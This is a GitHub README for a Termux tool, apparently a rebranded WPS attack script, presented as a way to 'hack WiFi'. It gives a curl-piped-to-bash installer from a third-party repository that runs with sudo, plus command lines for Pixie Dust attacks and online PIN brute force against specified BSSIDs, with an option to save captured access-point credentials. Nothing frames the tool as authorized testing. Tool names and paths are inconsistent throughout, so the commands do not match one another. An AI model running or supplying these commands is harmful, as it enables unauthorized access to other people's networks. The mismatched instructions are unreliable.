### Israfil-Munna-shot
 
### wifi-hack
<p align="center"><img src="https://user-images.githubusercontent.com/75953873/115979290-66309900-a55b-11eb-8259-4b125efc42bb.png"></p>

[![Python 3.5](https://img.shields.io/badge/Python-3.5-yellow.svg)](http://www.python.org/download/)
[![python](https://img.shields.io/badge/python-2.7-brightgreen.svg)](https://www.python.org/downloads/release/python-2714/)
[![OS](https://img.shields.io/badge/Tested%20On-Linux%20%7C%20Android-yellowgreen.svg)](https://termux.com/)

# Overview
**FARHAN-Shot2** performs [Pixie Dust attack](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-Offline-WPS-Attack) without having to switch to monitor mode.
# Features
 - [Pixie Dust attack](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-Offline-WPS-Attack);
 - integrated [3WiFi offline WPS PIN generator](https://3wifi.stascorp.com/wpspin);
 - [online WPS bruteforce](https://sviehb.files.wordpress.com/2011/12/viehboeck_wps.pdf);
 - Wi-Fi scanner with highlighting based on iw;
# Requirements
 - Python 3.6 and above;
 - [Wpa supplicant](https://www.w1.fi/wpa_supplicant/);
 - [Pixiewps](https://github.com/wiire-a/pixiewps);
 - [iw](https://wireless.wiki.kernel.org/en/users/documentation/iw).


Please note that root access is required.  

### Installation one line:
** and `instller` command 

```bash
curl -sSf https://raw.githubusercontent.com/gtajisan/FARHAN-Shot_Termux_installer/master/installer.sh | bash && sudo python FARHAN-Shot/FARHAN-Shot.py -i wlan0 -K
```

### How to update WifiHack
To check for updates and update, `run` the following command:
```
(cd Israfil-Munna-shot && git pull)
```

# FARHAN-Shot2_Termux_installer/Link ✔
**if don't understand click here**

[installer](https://github.com/Gtajisan/FARHAN-Shot_Termux_installer)
 
#### Manually
**Installing requirements**
 ```
pkg update && pkg upgrade && pkg install -y root-repo && pkg install -y git tsu python wpa-supplicant pixiewps iw openssl && termux-setup-storage
 ```
**run farhan hack py**
 ```
 git clone --depth 1 https://github.com/gtajisan/Israfil-Munna-shot Israfil-Munna-shot
 ```

#### Running fast command 😪?
 ```
sudo python Israfil-Munna-shot/Israfil-Munna-shot.py -i wlan0 -K 
 ```



### tool unstall cmd
```
rm -rf Israfil-Munna-shot
```

## [Termux](https://termux.com/)
Please note that root access is required.  


### Hack WIfi Using Termux! (Requires Root)
**SCREEN SHOTS [Termux]**

<br>
<p align="center">
<img width="50%" src="https://i.postimg.cc/fbzJnQL6/Screenshot-20231026-084714-Termux.png"/>
<img width="46%" src="https://i.postimg.cc/MKhWpDTR/Screenshot-20231029-202035-Termux.png"/>
</p>

# Usage
```
 Israfil-Munna-shot.py <arguments>
 Required arguments:
     -i, --interface=<wlan0>  : Name of the interface to use

 Optional arguments:
     -b, --bssid=<mac>        : BSSID of the target AP
     -p, --pin=<wps pin>      : Use the specified pin (arbitrary string or 4/8 digit pin)
     -K, --pixie-dust         : Run Pixie Dust attack
     -B, --bruteforce         : Run online bruteforce attack
     --push-button-connect    : Run WPS push button connection

 Advanced arguments:
     -d, --delay=<n>          : Set the delay between pin attempts [0]
     -w, --write              : Write AP credentials to the file on success
     -F, --pixie-force        : Run Pixiewps with --force option (bruteforce full range)
     -X, --show-pixie-cmd     : Alway print Pixiewps command
     --vuln-list=<filename>   : Use custom file with vulnerable devices list ['vulnwsc.txt']
     --iface-down             : Down network interface when the work is finished
     -l, --loop               : Run in a loop
     -r, --reverse-scan       : Reverse order of networks in the list of networks. Useful on small displays
     --mtk-wifi               : Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit
                                (for internal Wi-Fi adapters implemented in MediaTek SoCs). Turn off Wi-Fi in the system settings before using this.
     -v, --verbose            : Verbose output
 ```
#### Note: 
+ **First turn off your Wifi.**
+ **Turn on Hotspot.**
+ **Turn on Location.**


## Usage examples
Start Pixie Dust attack on a specified BSSID:
 ```
cd FARHAN-Shot && sudo python3 FARHAN-Shot.py -i wlan0 -b 00:90:4C:C1:AC:21 -K
 ```
Show avaliable networks and start Pixie Dust attack on a specified network:
 ```
cd FARHAN-Shot && sudo python3 FARHAN-Shot.py -i wlan0 -K
 ```
Launch online WPS bruteforce with the specified first half of the PIN:
 ```
cd FARHAN-Shot && sudo python3 FARHAN-Shot.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234
 ```
 Start WPS push button connection:s
 ```
cd FARHAN-Shot && sudo python3 FARHAN-Shot.py -i wlan0 --pbc
 ```
## Troubleshooting
#### "RTNETLINK answers: Operation not possible due to RF-kill"
 Just run:
```sudo rfkill unblock wifi```
#### "Device or resource busy (-16)"
 Try disabling Wi-Fi in the system settings and kill the Network manager. Alternatively, you can try running FARHAN-Shot2 with ```--iface-down``` argument.
#### The wlan0 interface disappears when Wi-Fi is disabled on Android devices with MediaTek SoC
 Try running FARHAN-Shot2 with the `--mtk-wifi` flag to initialize Wi-Fi device driver.

## CONNECT WITH US :

[![Messenger](https://img.shields.io/badge/Messenger-Chat-blue?style=for-the-badge&logo=messenger)](https://m.me/j/AbZoOyGXJvl_zUrC/)
<a href="https://github.com/Gtajisan"><img title="Github" src="https://img.shields.io/badge/FARHAN MUH TASIM-brightgreen?style=for-the-badge&logo=github"></a>
[![Instagram](https://img.shields.io/badge/FACEBOOK-FOLLOW-red?style=for-the-badge&logo=facebook)](https://facebook.com/reyadbross)
[![Instagram](https://img.shields.io/badge/FACEBOOK-FOLLOW-red?style=for-the-badge&logo=facebook)](https://www.facebook.com/profile.php?id=100094924471568&mibextid=gik2fB)
[![Instagram](https://img.shields.io/badge/WHATSAPP-CHAT-red?style=for-the-badge&logo=whatsapp)](https://wa.me/+8801305057238)
[![Instagram](https://img.shields.io/badge/INSTAGRAM-FOLLOW-red?style=for-the-badge&logo=instagram)](https://www.instagram.com/gtajsan)
[![Instagram](https://img.shields.io/badge/WEBSITE-VISIT-yellow?style=for-the-badge&logo=blogger)](https://gtajisan.github.io/Web-view/?raw=true)
[![Instagram](https://img.shields.io/badge/TELEGRAM-CHANNEL-red?style=for-the-badge&logo=telegram)](https://t.me/farhan_muh_tasim)


# Acknowledgements
## Special Thanks <span style='font-size:45px;'>&#128071;</span>
<a href="#"><img title="FARHAN-MUH-TASIM" src="https://img.shields.io/badge/FARHAN MUH TASIM-black?style=for-the-badge&logo=FARHAN MUH TASIM"></a>
